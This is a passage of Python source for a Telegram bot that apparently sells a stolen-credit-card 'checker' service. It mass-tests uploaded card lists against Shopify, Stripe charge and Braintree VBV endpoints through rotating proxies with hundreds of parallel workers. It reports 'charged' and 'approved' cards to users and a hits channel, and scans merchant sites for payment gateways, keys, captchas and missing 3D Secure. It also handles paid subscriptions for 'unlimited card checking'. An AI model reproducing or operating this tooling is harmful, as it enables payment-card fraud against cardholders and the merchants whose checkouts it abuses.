        # لو retry response → جرب site تاني
        if result.get('retry') or any(r in msg_lower for r in RETRY_RESPONSES):
            continue
        
        return result
    
    return {'status': 'Dead', 'message': 'All sites exhausted', 'card': card, 'gateway': 'Unknown', 'price': '-', 'price_value': 0}

# ===================== STRIPE CHARGE CHECKER =====================
async def check_card_stripe_charge(card, proxy=None, site=None):
    try:
        stripe_sites = load_stripe_sites()
        if not site and stripe_sites:
            site = random.choice(stripe_sites)
        url = f"{STRIPE_CHARGE_API_URL}?cc={card}"
        if site:
            url += f"&url={site}"
        if proxy:
            proxy_str = proxy
            if ':' in proxy:
                parts = proxy.split(':')
                if len(parts) == 4:
                    ip, port, user, password = parts
                    proxy_str = f"{ip}:{port}:{user}:{password}"
            url += f"&proxy={proxy_str}"
        session = await get_http_session()
        async with session.get(url) as resp:
            response_text = await resp.text()
        try:
            raw = json.loads(response_text)
        except:
            raw = {'Response': response_text, 'Charged': False, 'Approved': False, 'Price': '1$'}
        response_msg = raw.get('Response', response_text[:200])
        price = str(raw.get('Price', '1$'))
        gate = raw.get('Gate', 'Stripe Charge')
        pin = raw.get('pin')
        if not pin and 'pin:' in str(response_msg).lower():
            pin_match = re.search(r'pin:\s*(\d+)', str(response_msg), re.IGNORECASE)
            if pin_match:
                pin = pin_match.group(1)
        if raw.get('Charged') in [True, 'True', 'true', 1]:
            if pin:
                save_charged_card_with_pin(card, pin, 'stripe_charge', 'charged')
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
        elif raw.get('Approved') in [True, 'True', 'true', 1]:
            if pin:
                save_charged_card_with_pin(card, pin, 'stripe_charge', 'approved')
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
        else:
            # Check response text for live indicators
            resp_lower = str(response_msg).lower()
            if any(k in resp_lower for k in ['insufficient', 'cvv', 'incorrect', '3d', 'otp', 'authenticate']):
                return {'status': 'Approved', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price, 'pin': pin}
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'gateway': gate, 'price': price}
    except Exception as e:
        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'Stripe Charge', 'price': '1$'}

# ===================== VBV CHECKER =====================
async def check_card_vbv(card):
    try:
        url = f"{VBV_API_URL}?cc={card}"
        session = await get_http_session()
        async with session.get(url) as resp:
            response_text = await resp.text()
        try:
            raw = json.loads(response_text)
        except:
            if 'VBV Authenticate Successful' in response_text:
                pin_match = re.search(r'pin:\s*(\d+)', response_text, re.IGNORECASE)
                pin = pin_match.group(1) if pin_match else None
                if pin:
                    save_charged_card_with_pin(card, pin, 'vbv', '3ds')
                return {'status': '3DS', 'message': response_text[:150], 'card': card, 'gateway': 'VBV Braintree', 'price': '4$', 'pin': pin}
            return {'status': 'Declined', 'message': response_text[:150], 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}
        status = raw.get('status', '').lower()
        response_msg = raw.get('response', raw.get('message', raw.get('Response', response_text[:200])))
        pin = raw.get('pin')
        if not pin and 'pin:' in str(response_msg).lower():
            pin_match = re.search(r'pin:\s*(\d+)', str(response_msg), re.IGNORECASE)
            if pin_match:
                pin = pin_match.group(1)
        if status == 'approved' or 'successful' in str(response_msg).lower():
            if pin:
                save_charged_card_with_pin(card, pin, 'vbv', '3ds')
            return {'status': '3DS', 'message': response_msg, 'card': card, 'gateway': 'VBV Braintree', 'price': '4$', 'pin': pin}
        else:
            return {'status': 'Declined', 'message': response_msg, 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}
    except Exception as e:
        return {'status': 'Declined', 'message': str(e), 'card': card, 'gateway': 'VBV Braintree', 'price': '4$'}

async def test_site_with_price(site, proxy):
    test_card = "4111111111111111|01|2030|123"
    try:
        if not site.startswith('http'):
            site = f'https://{site}'
        proxy_str = None
        if proxy:
            proxy_parts = proxy.split(':')
            if len(proxy_parts) == 4:
                ip, port, user, password = proxy_parts
                proxy_str = f"{ip}:{port}:{user}:{password}"
            elif len(proxy_parts) == 2:
                ip, port = proxy_parts
                proxy_str = f"{ip}:{port}"
        url = f'{CHECKER_API_URL}?site={site}&cc={test_card}&key={CHECKER_API_KEY}'
        if proxy_str:
            url += f'&proxy={proxy_str}'
        session = await get_http_session()
        async with session.get(url) as resp:
                if resp.status != 200:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
                try:
                    raw = await resp.json()
                except:
                    return {'site': site, 'status': 'dead', 'price': 0.0}
        response_msg = raw.get("Response", "")
        response_msg = raw.get("card_response", raw.get("Response", ""))
        gateway = raw.get("gate", raw.get("Gate", raw.get("Gateway", "")))
        price_display = raw.get("price", raw.get("Price", "-"))
        price_value = float(str(price_display).replace("$","").replace(",","").strip()) if price_display not in ["-","0","0.0"] else 0.0
        if is_site_dead(response_msg, gateway, price_display):
            return {"site": site, "status": "dead", "price": 0.0}
        else:
            return {"site": site, "status": "alive", "price": price_value}
    except Exception as ex:
        print(f"[DEBUG EXCEPT] {site} error={ex}")
        return {"site": site, "status": "dead", "price": 0.0}
async def test_proxy(proxy):
    try:
        proxy_parts = proxy.split(':')
        if len(proxy_parts) == 4:
            ip, port, user, password = proxy_parts
            proxy_url = f'http://{user}:{password}@{ip}:{port}'
        elif len(proxy_parts) == 2:
            ip, port = proxy_parts
            proxy_url = f'http://{ip}:{port}'
        else:
            proxy_url = f'http://{proxy}'
        session = await get_http_session()
        async with session.get('https://www.shopify.com', proxy=proxy_url) as res:
                if res.status == 200:
                    return {'proxy': proxy, 'status': 'alive'}
                else:
                    return {'proxy': proxy, 'status': 'dead'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

async def send_realtime_hit(user_id, result, hit_type, username):
    brand, bin_type, level, bank, country, flag = await get_bin_info(result['card'].split('|')[0])
    if hit_type == "Charged":
        status_text = "𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥"
        emoji = "💎"
    else:
        status_text = "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅"
        emoji = "✅"
    message = f"""{status_text}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}"""
    try:
        # Send anime celebration video with the hit
        anime_videos = [
            'https://cdn3.telegrambots.org/wp-content/uploads/2023/09/Animation-1711951622.mp4',
            'https://cdn3.telegrambots.org/wp-content/uploads/2023/09/Animation-1711951622.mp4',
        ]
        video_url = random.choice(anime_videos)
        try:
            await bot.send_message(user_id, premium_emoji(message), parse_mode='html')
        except:
            pass
    except:
        pass

# Global counter for edit throttling
_edit_counters = {}

async def update_progress(user_id, message_id, results, current_attempt_count):
    # Throttle: only edit every 5 cards OR every 3 seconds
    import time
    key = f"{user_id}_{message_id}"
    now = time.time()
    last_data = _edit_counters.get(key, {'count': 0, 'time': 0})
    
    # Update counter
    last_data['count'] += 1
    
    # Check if we should edit (every 5 cards OR every 3 seconds)
    should_edit = (
        last_data['count'] >= 100 or  # Every 5 cards
        (now - last_data['time']) >= 5.0  # OR every 3 seconds
    )
    
    if not should_edit:
        return  # Skip this edit
    
    # Reset counter and update time
    last_data['count'] = 0
    last_data['time'] = now
    _edit_counters[key] = last_data
    
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    
    total = results['total']
    checked = results['checked']
    remaining = total - checked
    
    percentage = int((checked / total) * 100) if total > 0 else 0
    
    bar_length = 16
    filled = int(bar_length * checked / total) if total > 0 else 0
    bar = "█" * filled + "░" * (bar_length - filled)
    
    progress_text = f"""💳 Cᴀʀᴅ: <code>{results.get('last_card', 'None')[:16]}</code>
📝 {results.get('last_response', 'Waiting...')[:16]}
💰 {results.get('last_price', '-')[:7]}
∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼∼
{bar}
❌ Dᴇᴄʟɪɴᴇᴅ: {len(results.get('dead', []))}
📊 {checked}/{total} ({percentage}%) | Rᴇᴍᴀɪɴɪɴɢ: {remaining}
⏱️ {hours:02d}:{minutes:02d}:{seconds:02d}
"""
    buttons = [
        [Button.inline(f" Cʜᴀʀɢᴇᴅ {len(results['charged'])}", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5444987348334965906)],
        [Button.inline(f" Aᴘᴘʀᴏᴠᴇᴅ {len(results['approved'])}", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5343636681473935403)],
        [Button.inline(f" Eʀʀᴏʀs {len(results.get('errors', []))}", f"shopify_export_errors:{user_id}".encode(), style="danger", icon=4915853119839011973)],
        [Button.inline(" Sᴛᴏᴘ", f"stop_{user_id}".encode(), style="danger", icon=4915890090917495591)]
    ]
    try:
        await bot.edit_message(user_id, message_id, premium_emoji(progress_text), buttons=buttons, parse_mode='html')
    except:
        pass

async def send_final_results(user_id, results):
    elapsed = int(time.time() - results['start_time'])
    hours = elapsed // 3600
    minutes = (elapsed % 3600) // 60
    seconds = elapsed % 60
    hits_text = ""
    if results['charged']:
        for r in results['charged'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if results['approved']:
        for r in results['approved'][:5]:
            hits_text += f" <code>{r['card']}</code>\n"
    if not hits_text:
        hits_text = "Nᴏ ʜɪᴛs ғᴏᴜɴᴅ"
    gateway = results['charged'][0]['gateway'] if results['charged'] else (results['approved'][0]['gateway'] if results['approved'] else 'Unknown')
    errors_count = len(results.get('errors', []))
    
    summary = f"""✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ! ✅

📊 Rᴇsᴜʟᴛs:
   ┣ ✅ 𝗖𝗛𝗔𝗥𝗚𝗘𝗗 🔥: {len(results['charged'])}
   ┣ 🔥 𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅: {len(results['approved'])}
   ┣ ❌ Dᴇᴄʟɪɴᴇᴅ: {len(results['dead'])}
   ┣ ⚠️ Eʀʀᴏʀs: {errors_count}
   ┗ 📊 Tᴏᴛᴀʟ: {results['total']}

Hɪᴛs:
{hits_text}

💡 Mᴀᴅᴇ ʙʏ @znzii  """

    buttons = []
    if results['charged']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Cʜᴀʀɢᴇᴅ ({len(results['charged'])})", f"shopify_export_charged:{user_id}".encode(), style="success", icon=5343636681473935403)])
    if results['approved']:
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Aᴘᴘʀᴏᴠᴇᴅ ({len(results['approved'])})", f"shopify_export_approved:{user_id}".encode(), style="primary", icon=5123248930124989216)])
    if results.get('errors'):
        buttons.append([Button.inline(f" Exᴘᴏʀᴛ Eʀʀᴏʀs ({errors_count})", f"shopify_export_errors:{user_id}".encode(), style="danger", icon=4915853119839011973)])
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"gpi6{timestamp}.txt"
    async with aiofiles.open(filename, 'w') as f:
        await f.write("CC CHECKER RESULTS\n")
        await f.write(f"CHARGED ({len(results['charged'])}):\n")
        for r in results['charged']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"APPROVED ({len(results['approved'])}):\n")
        for r in results['approved']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"DECLINED ({len(results['dead'])}):\n")
        for r in results['dead']:
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
        await f.write("\n")
        await f.write(f"ERRORS ({len(results.get('errors', []))}):\n")
        for r in results.get('errors', []):
            await f.write(f"{r['card']} | {r.get('gateway', 'Unknown')} | {r.get('price', '-')} | {r['message'][:100]}\n")
    
    await bot.send_message(user_id, premium_emoji(summary), file=filename, buttons=buttons if buttons else None, parse_mode='html')
    try:
        os.remove(filename)
    except:
        pass

async def process_file_with_filters(event, user_id):
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = extract_cc(content)
        if len(cards) > 10000 and user_id not in ADMIN_ID: cards = cards[:10000]
        if not cards:
            await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            os.remove(file_path)
            return
        TEMP_FILE_DATA[user_id] = {'cards': cards, 'file_path': file_path}
        filters = await load_price_filters()
        gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
        buttons = []
        row = []
        for i, f in enumerate(gateway_filters):
            row.append(Button.inline(f["name"], f"price_fltr:{i}:{user_id}".encode(), style="primary", icon=5348503265967355284))
            if len(row) == 2:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        buttons.append([Button.inline("  Cᴀɴᴄᴇʟ", b"cancel_filter", style="danger", icon=5447647474984449520)])
        await event.reply(
            premium_emoji(f"📁 Fɪʟᴇ ʟᴏᴀᴅᴇᴅ: {len(cards)} ᴄᴀʀᴅs ғᴏᴜɴᴅ!\n\n💰 Sᴇʟᴇᴄᴛ ᴀ ᴘʀɪᴄᴇ ғɪʟᴛᴇʀ:"),
            buttons=buttons,
            parse_mode='html'
        )
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

async def start_mass_check(user_id, cards, sites, event):
    if not sites:
        await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ!"), parse_mode='html')
        return
    proxies = get_user_proxies(user_id)
    if not proxies:
        await event.edit(premium_emoji("❌  Nᴏ ᴘʀᴏxɪᴇs!\n\nᴜsᴇ /ᴀᴅᴅᴍʏᴘʀᴏxʏ ᴛᴏ ᴀᴅᴅ ʏᴏᴜʀ ᴘʀᴏxɪᴇs"), parse_mode='html')
        return
    status_msg = await event.edit(premium_emoji(f"🔥 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ғᴏʀ {len(cards)} ᴄᴀʀᴅs..."), parse_mode='html')
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    all_results = {
        'charged': [], 'approved': [], 'dead': [], 'errors': [],
        'total': len(cards), 'checked': 0,
        'start_time': time.time(),
        'last_card': '', 'last_response': '', 'last_price': '-', 'last_gateway': 'Unknown'
    }
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        last_update_time = [time.time()]
        async def worker():
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(2)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                current_sites = sites
                current_proxies = get_user_proxies(user_id)
                if not current_sites or not current_proxies:
                    break
                res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=999)
                all_results['checked'] += 1
                all_results['last_card'] = card
                all_results['last_response'] = res.get('message', '')[:50]
                all_results['last_price'] = res.get('price', '-')
                all_results['last_gateway'] = res.get('gateway', 'Unknown')
                if res['status'] == 'Charged':
                    all_results['charged'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', 'user')
                    try:
                        _sender = await bot.get_entity(user_id)
                        _uname = _sender.username if _sender.username else None
                    except: _uname = None
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'), user_id, _uname)
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', 'user')
                    try:
                        _sender = await bot.get_entity(user_id)
                        _uname = _sender.username if _sender.username else None
                    except: _uname = None
                    await send_hit_to_channel(res['card'], res['status'], res['message'], res.get('gateway', 'Unknown'), res.get('price', '-'), user_id, _uname)
                else:
                    response_lower = res.get('message', '').lower()
                    if any(key in response_lower for key in ["declined", "generic_error", "generic", "decision_rule_block", "incorrect_number", "brand_not_supported", "payments_credit_card_base_expired"]):
                        all_results['dead'].append(res)  
                    else:
                        if 'errors' not in all_results:
                            all_results['errors'] = []
                        all_results['errors'].append(res)  
                queue.task_done()
                now = time.time()
                if now - last_update_time[0] >= 1.0:
                    last_update_time[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except:
                            pass
        workers = [asyncio.create_task(worker()) for _ in range(300)]
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Aɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ: {e}"), parse_mode='html')
    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, all_results)
        SHOPIFY_SESSION_RESULTS[user_id] = all_results
        await asyncio.sleep(300)
        SHOPIFY_SESSION_RESULTS.pop(user_id, None)


CARD_FORM_PATTERNS = [
    re.compile(r'name\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(r'id\s*=\s*["\'](?:cardnumber|card_number|ccnumber|cc-number|card-num)["\']', re.I),
    re.compile(r'placeholder\s*=\s*["\'](?:Card Number|Credit Card|Card No)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:cvv|cvv2|cvc|security_code|card_cvc|card-cvc)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:expiry|expdate|exp_date|cc-exp|exp-month|exp-year)["\']', re.I),
    re.compile(r'name\s*=\s*["\'](?:billing|payment_method_nonce|credit_card)["\']', re.I),
    re.compile(r'data-(?:stripe|braintree|square|card)[\w-]*=\s*["\']', re.I),
    re.compile(r'Stripe\(|braintree\.dropin|sqpaymentform', re.I),
]

def _scripts(html: str) -> list[str]:
    return re.findall(r'<script[^>]*src\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)

def _in(text: str, *patterns: str) -> bool:
    t = text.lower()
    for p in patterns:
        if p.lower() in t:
            return True
    return False

def has_card_form(html: str) -> bool:
    for p in CARD_FORM_PATTERNS:
        if p.search(html):
            return True
    return False

def detect_gateways(html: str) -> list[str]:
    found = []
    srcs = _scripts(html)
    h = html.lower()
    
    # Stripe
    for s in srcs:
        if "js.stripe.com" in s.lower():
            found.append("Stripe")
            break
    if not found and (re.search(r'pk_live_|pk_test_', html) or "stripe.com" in h):
        found.append("Stripe")
    
    # PayPal
    for s in srcs:
        if "paypal.com/sdk" in s.lower() or "paypalobjects.com" in s.lower():
            found.append("PayPal")
            break
    if not found and ("paypal.com" in h or "data-paypal-button" in h):
        found.append("PayPal")
    
    # Shopify
    for s in srcs:
        if "myshopify.com" in s.lower() or "cdn.shopify.com" in s.lower():
            found.append("Shopify")
            break
    if not found and ("shopify.com" in h or "shopify_pay" in h):
        found.append("Shopify")
    
    # Braintree
    for s in srcs:
        if "braintreegateway.com" in s.lower() or "braintree.js" in s.lower():
            found.append("Braintree")
            break
    if not found and "braintree.dropin" in h:
        found.append("Braintree")
    
    # WooCommerce
    if "wp-content/plugins/woocommerce" in h or "woocommerce" in h:
        found.append("WooCommerce")
    
    # Authorize.net
    for s in srcs:
        if "authorize.net" in s.lower() or "accept.js" in s.lower():
            found.append("Authorize.net")
            break
    
    # Square
    for s in srcs:
        if "square.com/checkout" in s.lower() or "squarecdn.com" in s.lower():
            found.append("Square")
            break
    if not found and "sqpaymentform" in h:
        found.append("Square")
    
    # Razorpay
    for s in srcs:
        if "razorpay.com" in s.lower():
            found.append("Razorpay")
            break
    if not found and "razorpay" in h:
        found.append("Razorpay")
    
    # Adyen
    for s in srcs:
        if "adyen.com" in s.lower():
            found.append("Adyen")
            break
    if not found and "adyen." in h:
        found.append("Adyen")
    
    # Mollie
    for s in srcs:
        if "mollie.com" in s.lower():
            found.append("Mollie")
            break
    if not found and "mollie." in h:
        found.append("Mollie")
    
    # Klarna
    if "klarna." in h or "klarna.com" in h:
        found.append("Klarna")
    
    # Afterpay
    if "afterpay" in h or "clearpay" in h:
        found.append("Afterpay")
    
    # Mercado Pago
    for s in srcs:
        if "mercadopago.com" in s.lower():
            found.append("Mercado Pago")
            break
    if not found and "mercadopago" in h:
        found.append("Mercado Pago")
    
    # PagSeguro
    for s in srcs:
        if "pagseguro" in s.lower():
            found.append("PagSeguro")
            break
    if not found and "pagseguro" in h:
        found.append("PagSeguro")
    
    # Paddle
    for s in srcs:
        if "paddle.com" in s.lower() or "paddle." in s.lower():
            found.append("Paddle")
            break
    if not found and "paddle." in h:
        found.append("Paddle")
    
    return list(dict.fromkeys(found))

def detect_cms(html: str) -> list[str]:
    found = []
    h = html.lower()
    
    if "/wp-content/" in h or "wp-json" in h:
        found.append("WordPress")
    if "woocommerce" in h:
        found.append("WooCommerce")
    if "myshopify.com" in h or "cdn.shopify.com" in h:
        found.append("Shopify")
    if "static/version" in h or "magento" in h:
        found.append("Magento")
    if "joomla" in h:
        found.append("Joomla")
    if "drupal.js" in h or "drupal.org" in h:
        found.append("Drupal")
    if "prestashop" in h:
        found.append("PrestaShop")
    if "bigcommerce.com" in h:
        found.append("BigCommerce")
    if "wixstatic.com" in h:
        found.append("Wix")
    if "squarespace.com" in h:
        found.append("Squarespace")
    if "webflow" in h:
        found.append("Webflow")
    if "weebly.com" in h:
        found.append("Weebly")
    
    return list(dict.fromkeys(found)) if found else ["Unknown"]

def detect_captcha(html: str) -> str | None:
    h = html.lower()
    if "recaptcha" in h or "g-recaptcha" in h:
        return "reCAPTCHA"
    if "hcaptcha" in h:
        return "hCaptcha"
    if "turnstile" in h or "cf-turnstile" in h:
        return "Cloudflare Turnstile"
    return None

def detect_cloudflare(headers, html: str) -> str | None:
    h = html.lower()
    if "__cfduid" in h or "cf-browser-verification" in h:
        return "Cloudflare"
    return None

def detect_cdn(html: str, headers) -> str | None:
    h = html.lower()
    if "cloudflare" in h:
        return "Cloudflare"
    if "fastly" in h:
        return "Fastly"
    if "akamai" in h:
        return "Akamai"
    if "cloudfront" in h:
        return "AWS CloudFront"
    return None

def detect_3d_secure(html: str) -> str:
    h = html.lower()
    if any(x in h for x in ["3d_secure", "3dsecure", "requires_action", "cardinalcommerce", "cavv"]):
        return "3D Secure Found ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_graphql(html: str) -> str:
    h = html.lower()
    if "/graphql" in h or "graphql" in h:
        return "GraphQL Found ✅"
    return "No GraphQL Found ❌"

def extract_gateway_keys(html: str) -> dict[str, list[str]]:
    result = {}
    
    # Stripe keys
    stripe_keys = re.findall(r'pk_(?:live|test)_[A-Za-z0-9_-]{10,}', html)
    if stripe_keys:
        result["Stripe"] = list(dict.fromkeys(stripe_keys))
    
    # PayPal client IDs
    paypal_keys = re.findall(r'client-id[=:][\'"]?([A-Za-z0-9_-]{30,})', html, re.IGNORECASE)
    if paypal_keys:
        result["PayPal"] = list(dict.fromkeys(paypal_keys))
    
    return result

def detect_analytics(html: str, srcs: list[str]) -> list[str]:
    found = []
    h = html.lower()
    
    for s in srcs:
        if "google-analytics.com" in s.lower() or "googletagmanager.com" in s.lower():
            if "Google Analytics" not in found:
                found.append("Google Analytics")
        elif "connect.facebook.net" in s.lower():
            if "Facebook Pixel" not in found:
                found.append("Facebook Pixel")
        elif "hotjar.com" in s.lower():
            if "Hotjar" not in found:
                found.append("Hotjar")
    
    if not found:
        if "gtag" in h or "ga(" in h:
            found.append("Google Analytics")
        if "fbq(" in h:
            found.append("Facebook Pixel")
    
    return found


@bot.on(events.NewMessage(pattern='/balance'))
async def balance_command(event):
    user_id = event.sender_id
    stars = get_stars(user_id)
    await event.reply(premium_emoji(f"⭐ <b>Yᴏᴜʀ Sᴛᴀʀs</b>\n\n⭐ {stars} stars\n\n💡 <i>Having stars = unlimited checks</i>\n📅 <i>Daily bonus: {DAILY_STARS} stars</i>"), parse_mode='html')
@bot.on(events.NewMessage(pattern='/subscribe'))
async def subscribe_command(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)

    if is_prem:
        data = load_premium_data()
        uid = str(user_id)
        expiry = data.get(uid, {}).get('expiry')
        if expiry:
            exp_dt = datetime.fromisoformat(expiry)
            diff = exp_dt - datetime.now()
            hours = int(diff.total_seconds() // 3600)
            mins = int((diff.total_seconds() % 3600) // 60)
            await event.reply(
                premium_emoji(f"✅ <b>Yᴏᴜ Aʀᴇ Pʀᴇᴍɪᴜᴍ!</b>\n\n⏰ <b>Rᴇᴍᴀɪɴɪɴɢ:</b> {hours}h {mins}m\n📅 <b>Eɴᴅs:</b> {exp_dt.strftime('%Y-%m-%d %H:%M')}"),
                parse_mode='html'
            )
            return
        else:
            await event.reply(
                premium_emoji("✅ <b>Yᴏᴜ Aʀᴇ Pʀᴇᴍɪᴜᴍ (Permanent)!</b>"),
                parse_mode='html'
            )
            return

    # Try Telegram Stars invoice using raw API
    try:
        from telethon.tl.types import Invoice, LabeledPrice, InputMediaInvoice, DataJSON
        from telethon.tl import functions
        import random as rnd
        
        # Build invoice
        invoice = Invoice(
            currency="XTR",
            prices=[LabeledPrice(label="1 Day Access", amount=100)],
            test=True,
            flexible=False,
        )
        
        # Build InputMediaInvoice
        media = InputMediaInvoice(
            title="⭐ 1 Day Premium Access",
            description="Unlimited card checking for 24 hours!",
            invoice=invoice,
            payload=b"premium_1day",
            provider_data=DataJSON(data="{}"),
        )
        
        # Send invoice using SendMediaRequest
        result = await bot(functions.messages.SendMediaRequest(
            peer=await event.get_input_chat(),
            media=media,
            message="⭐ Pay with Telegram Stars",
            random_id=rnd.getrandbits(64),
        ))
        print(f"[+] Invoice sent to {user_id}")
    except Exception as e:
        print(f"[-] Invoice error: {e}")
        import traceback
        traceback.print_exc()
        # Fallback
        await event.reply(
            premium_emoji(f"⭐ <b>Sᴜʙsᴄʀɪᴘᴛɪᴏɴ</b>\n\n💰 <b>Pʀɪᴄᴇ:</b> 100 Telegram Stars\n📅 <b>Dᴜʀᴀᴛɪᴏɴ:</b> 1 Day\n\n🔑 <b>How to subscribe:</b>\n1. Send 100 stars to @znzii\n2. Screenshot the payment\n3. Send screenshot here\n4. Admin will activate your access"),
            parse_mode='html',
            buttons=[[Button.url(" 💳 Pᴀʏ Nᴏᴡ", "https://t.me/znzii")]]
        )

# Handle pre-checkout (when user clicks pay)
@bot.on(events.Raw(types=tl_types.UpdateBotPrecheckoutQuery))
async def pre_checkout_handler(event):
    user_id = event.user_id
    query_id = event.query_id
    print(f"[*] Pre-checkout from {user_id}")
    try:
        await bot(functions.messages.SetBotPrecheckoutResultsRequest(
            query_id=query_id,
            ok=True,
        ))
        print(f"[+] Pre-checkout accepted for {user_id}")
    except Exception as e:
        print(f"[-] Pre-checkout error: {e}")

# Handle successful payment - via MessageActionPaymentSent
@bot.on(events.NewMessage(func=lambda e: e.message and e.message.action and isinstance(e.message.action, tl_types.MessageActionPaymentSentMe)))
async def successful_payment_handler(event):
    user_id = event.user_id
    print(f"[*] Payment received from {user_id}!")
    # Give 1 day premium
    await add_premium_user(user_id, hours=24, paid=True)
    # Notify user
    try:
        await bot.send_message(user_id, premium_emoji("""✅ <b>Pᴀʏᴍᴇɴᴛ Sᴜᴄᴄᴇssғᴜʟ!</b>

⭐ <b>1 Day Premium Activated!</b>
📅 <b>Expires:</b> 24 hours from now

🚀 Enjoy unlimited card checking!"""), parse_mode='html')
    except:
        pass
    # Notify admin channel
    try:
        sender = await bot.get_entity(user_id)
        username = f"@{sender.username}" if sender.username else sender.first_name or "Unknown"
        await bot.send_message(HITS_CHANNEL_ID, premium_emoji(f"""💰 <b>Pᴀʏᴍᴇɴᴛ Rᴇᴄᴇɪᴠᴇᴅ!</b>

👤 <a href=\"tg://user?id={user_id}\">{username}</a> (<code>{user_id}</code>)
⭐ <b>1 Day Premium Activated</b>"""), parse_mode='html')
    except:
        pass
    print(f"[+] Premium activated for {user_id}")

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    is_prem = is_premium(user_id)
    save_user_to_broadcast(user_id)
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    
    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
